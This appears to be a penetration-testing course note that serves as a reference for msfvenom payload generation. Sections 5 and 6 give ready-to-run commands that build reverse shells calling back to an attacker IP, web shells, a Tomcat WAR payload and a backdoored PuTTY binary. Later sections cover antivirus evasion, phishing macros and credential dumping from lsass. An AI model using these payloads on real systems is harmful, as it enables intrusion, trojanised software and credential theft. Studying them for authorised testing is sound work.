---
tags: [tools, network, exploit, vapt]
difficulty: intermediate
module: "59 - Complete Tools Reference"
topic: "59.49 Msfvenom Payload Generation"
---

# Msfvenom Payload Generation Reference

## 1. Introduction to Msfvenom

Msfvenom is a standalone payload generation and encoding utility, merging the functionality of the older `msfpayload` and `msfencode` tools into a single, highly efficient framework. It operates as the command-line interface for the Metasploit Framework's payload generation engine.

While Metasploit's `msfconsole` handles live exploitation, Msfvenom is utilized for generating standalone artifacts: malicious executables, macro scripts, web shells, and raw shellcode blocks. These artifacts are then deployed manually by the penetration tester—either via social engineering (phishing attachments), arbitrary file upload vulnerabilities, or manual execution on a compromised host.

Understanding Msfvenom's syntax, payload architectures, and formatting capabilities is an absolute requirement for Red Teaming, Exploit Development, and passing practical certifications like the OSCP.

## 2. Architecture of Payload Generation

Generating a payload involves selecting the architectural target, the payload type (reverse, bind, staged, stageless), encoding it to avoid bad characters or signature detection, and formatting it into a deployable wrapper (like a PE executable, an ELF binary, or raw Python code).

### ASCII Architecture Diagram: Msfvenom Pipeline

```text
+---------------------------------------------------------------------------------+
|                           Msfvenom Generation Pipeline                          |
+---------------------------------------------------------------------------------+
|                                                                                 |
|  [1] Payload Selection          [2] Architecture & Platform                     |
|  (-p windows/x64/meterpreter...) (-a x86 --platform windows)                    |
|          |                               |                                      |
|          +-------------------------------+                                      |
|                          |                                                      |
|                          v                                                      |
|                 +-----------------+                                             |
|                 | Raw Shellcode   |  <--- [3] LHOST / LPORT Injection           |
|                 | Generation      |                                             |
|                 +--------+--------+                                             |
|                          |                                                      |
|                          v                                                      |
|  [4] Bad Character      / \     [5] Encoding (-e x86/shikata_ga_nai -i 3)       |
|      Filtering         /   \    (Optional, modifies shellcode mathematically)   |
|      (-b '\x00')      /     \                                                   |
|                      +-------+                                                  |
|                          |                                                      |
|                          v                                                      |
|                 +-----------------+                                             |
|                 | Processed       |  <--- [6] Custom Template Injection (-x)    |
|                 | Shellcode       |                                             |
|                 +--------+--------+                                             |
|                          |                                                      |
|                          v                                                      |
|  [7] Formatting (-f exe, raw, py, elf, aspx)                                    |
|                          |                                                      |
|                          v                                                      |
|                 +-----------------+                                             |
|                 | Final Artifact  |  ==>  Output to File (-o payload.exe)       |
|                 +-----------------+                                             |
|                                                                                 |
+---------------------------------------------------------------------------------+
```

## 3. Payload Topologies: Bind vs. Reverse

Msfvenom payloads generally fall into two networking categories, dictating the direction of the connection.

### Reverse Shells (`reverse_tcp`, `reverse_https`)
In a reverse shell, the target machine actively initiates a connection out to the attacker's machine.
- **Use Case:** This is the most common payload because it naturally bypasses ingress firewalls. Most corporate firewalls block inbound connections but allow outbound traffic on common ports like 80 or 443.
- **Requirement:** The attacker must have a publicly accessible IP address (or NAT port forwarding) and a listener (`multi/handler` or Netcat) actively waiting.

### Bind Shells (`bind_tcp`)
In a bind shell, the payload opens a listening port directly on the compromised target machine. The attacker then connects to this port.
- **Use Case:** Used primarily in internal networks where egress filtering drops outgoing connections, or when attacking a machine directly on the same subnet without routing issues.
- **Drawback:** Highly likely to be blocked by local Windows Defender Firewall or iptables on the target machine.

## 4. Format Selection

Msfvenom can wrap the raw shellcode in dozens of formats depending on the target vector.

### Executable Formats
Used for social engineering or executing on a system where you already have code execution.
- `exe`: Standard Windows PE executable.
- `elf`: Linux Executable and Linkable Format.
- `macho`: macOS executable format.
- `msi`: Windows Installer package.

### Web Payload Formats
Used to exploit Arbitrary File Upload vulnerabilities.
- `php`: Raw PHP web shell.
- `aspx`: ASP.NET web shell.
- `jsp`: Java Server Pages web shell.
- `war`: Java Web Archive (useful for deploying to Tomcat servers).

### Script and Shellcode Formats
Used for exploit development or living-off-the-land techniques.
- `raw` / `c` / `python` / `ruby`: Outputs raw byte arrays for hardcoding into exploit scripts.
- `psh-cmd`: PowerShell command wrapper.
- `vba`: Macro code for embedding in malicious Word/Excel documents.

## 5. Core Msfvenom Syntax and Examples

### Basic Windows Reverse Shell (Stageless)
Generates a standalone executable that immediately connects back.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```

### Windows Meterpreter (Staged)
Generates a tiny executable that connects back, allocates memory, and pulls the massive Meterpreter DLL down.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```
*Note: This strictly requires a Metasploit `exploit/multi/handler` listening on the attacker side, as Netcat cannot handle the staged Meterpreter negotiation protocol.*

### Linux ELF Reverse Shell
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
```

### PHP Web Shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```

### Java WAR payload (for Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o root.war
```

## 6. Advanced Usage: Exploit Development

When writing buffer overflow exploits, Msfvenom is used to generate the exact shellcode payload that will be placed into the buffer.

### Avoiding Bad Characters (`-b`)
In memory corruption vulnerabilities, certain characters (like the null byte `\x00` or carriage return `\x0a`) will break the exploit by truncating the payload. Msfvenom uses encoders to mathematical alter the shellcode to avoid these bytes.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b "\x00\x0a\x0d" -f c
```

### Encoding and Iterations (`-e`, `-i`)
The `x86/shikata_ga_nai` encoder is the most famous polymorphic XOR additive feedback encoder. It changes the signature of the payload every time it is generated. Running multiple iterations (`-i 3`) encodes the payload three times.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -b "\x00" -f exe -o encoded.exe
```
**CRITICAL OPSEC NOTE:** Encoding via Msfvenom is almost entirely useless for bypassing modern Antivirus (like Windows Defender) in 2026. Antivirus engines trivially recognize the decoder stubs of `shikata_ga_nai`. Encoding should strictly be used for bypassing bad character restrictions in exploit development. To bypass AV, you must use custom loaders, shellcode encryption (AES/RC4), and syscall unhooking techniques.

### Template Injection (`-x`)
Msfvenom can inject shellcode into an existing, legitimate executable (like PuTTY or Notepad). This is useful for social engineering, as the binary will retain its original icon and metadata.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoored.exe
```
*The `-k` flag tells the payload to run as a separate thread, allowing the original program to function normally without crashing.*

## 7. Custom Payloads vs. Metasploit Payloads

While Metasploit payloads are highly reliable, they are also highly signatured.
In advanced Red Teaming, operators rarely use `windows/meterpreter/reverse_tcp`. Instead, they use Msfvenom to generate pure, raw shellcode (`-f raw`), encrypt that shellcode using a custom python script, and then compile a custom C# or C++ loader that decrypts the shellcode in memory and executes it. This decouples the easily signatured execution mechanism from the payload itself.

## 8. Payload Architecture Deep Dive: x86 vs x64

The target architecture significantly impacts payload design.
- **x86 Shellcode:** Historically, 32-bit payloads were the standard. They are generally smaller and more flexible due to the legacy instruction set. Many x86 exploits still work on x64 systems due to Windows-on-Windows (WoW64) compatibility subsystems, provided the vulnerable process itself is 32-bit.
- **x64 Shellcode:** Native 64-bit shellcode is required when attacking a native 64-bit process or service. Modern Windows kernels rigorously enforce PatchGuard and ASLR (Address Space Layout Randomization). Msfvenom handles the complexity of generating position-independent shellcode that resolves the base address of `kernel32.dll` dynamically by walking the PEB (Process Environment Block).

**Important Note on Migrations:**
If you execute a 32-bit Meterpreter payload on a 64-bit system, you will be operating within a WoW64 process. This limits your visibility into the native 64-bit processes on the system, preventing you from injecting or migrating into `lsass.exe` to dump credentials. Therefore, matching the payload architecture to the host OS architecture (`windows/x64/...`) is always preferred.

## 9. Creating Specialized Embedded Payloads

Msfvenom excels at generating macro payloads for Office documents.
Using `-f vba`, Msfvenom will output a fully functional Visual Basic for Applications script. This script contains the hexadecimal representation of the shellcode and leverages Windows API calls (like `VirtualAlloc`, `RtlMoveMemory`, and `CreateThread`) directly within the macro to execute the payload entirely in memory without writing an executable to disk.
This is heavily used in targeted phishing campaigns.

## 10. Chaining Opportunities
- **Exploitation:** Generate a WAR payload with Msfvenom and upload it to an exposed Tomcat manager discovered via [[46 - Masscan High-Speed Port Scanner]].
- **Catching Shells:** Generated payloads must be caught. Use [[48 - Metasploit Auxiliary Exploits Post Modules]] (specifically `multi/handler`) to catch staged payloads, or standard Netcat for stageless shells.
- **Web App Vectors:** Generate an `.aspx` payload and use it in conjunction with arbitrary file upload vulnerabilities discovered during web app testing.

## 11. Related Notes
- [[48 - Metasploit Auxiliary Exploits Post Modules]]
- [[46 - Masscan High-Speed Port Scanner]]
- [[14 - Nuclei Vulnerability Scanner]]
- [[50 - Hydra All Protocols Reference]]
